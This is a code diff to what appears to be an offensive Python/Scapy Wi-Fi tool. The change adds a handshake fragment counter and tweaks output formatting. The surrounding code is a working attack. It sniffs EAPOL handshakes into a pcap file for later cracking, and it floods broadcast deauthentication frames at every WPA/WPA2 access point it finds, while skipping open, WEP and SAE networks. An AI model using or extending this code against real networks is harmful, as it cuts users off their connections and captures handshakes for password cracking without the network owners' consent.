@@ -59,6 +59,7 @@ TARGET_LOCK = Lock()
 INTERFACE = ""
 PCAPWRITER = PcapWriter(PCAP, append=True, sync=True)
 PRINT_SEPARATOR = " "*35
+HANDSHAKE_FRAG_COUNTER = 0
 
 def alreadySeen(s):
     with TARGET_LOCK:
@@ -69,9 +70,11 @@ def alreadySeen(s):
 
 """ PASSIVE HANDSHAKE SNIFFING """
 def handshake_sniffer(pkt):
+    global HANDSHAKE_FRAG_COUNTER
     PCAPWRITER.write(pkt)
     if EAPOL in pkt:
-        print(f"[bright_black]+[/bright_black] Captured an [green]EAPOL[/green] packet.{PRINT_SEPARATOR}")
+        HANDSHAKE_FRAG_COUNTER += 1
+        print(f"[bright_black]+{HANDSHAKE_FRAG_COUNTER}[/bright_black] Captured [green]handshake[/green] fragment.{PRINT_SEPARATOR}")
 
 def intercept_handshakes():
     global INTERFACE
@@ -85,7 +88,7 @@ def deauthenticate_wifi_network(target_mac):
     pkt = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / Dot11Deauth()
 
     for x in range(100):
-        print(f"[bright_black]{getTimestamp()} Shooting laser beam at [red]{target_mac}[/red]...[/bright_black]", end="\r")
+        print(f"[bright_black]{getTimestamp()} Shooting laser beam at [red]{target_mac}[/red]...[/bright_black]{PRINT_SEPARATOR}", end="\r")
         sendp(pkt, iface=INTERFACE, verbose=0)
 
 def active_deauth_attack(pkt):
@@ -104,7 +107,7 @@ def active_deauth_attack(pkt):
             wifiFullInfo = f"'{wifi_name}' ({wifi_mac})"
 
             if enctype == "OPN" or enctype == "WEP" or enctype == "unknown" or "SAE" in enctype:
-                print(f"[bright_black]{getTimestamp()} Skipping [yellow]{wifiFullInfo}[/yellow]...[/bright_black]", end="\r")
+                print(f"[bright_black]{getTimestamp()} Skipping [yellow]{wifiFullInfo}[/yellow]...[/bright_black]{PRINT_SEPARATOR}", end="\r")
             else:
                 Thread(target=deauthenticate_wifi_network, args=(wifi_mac,), daemon=True).start()
 
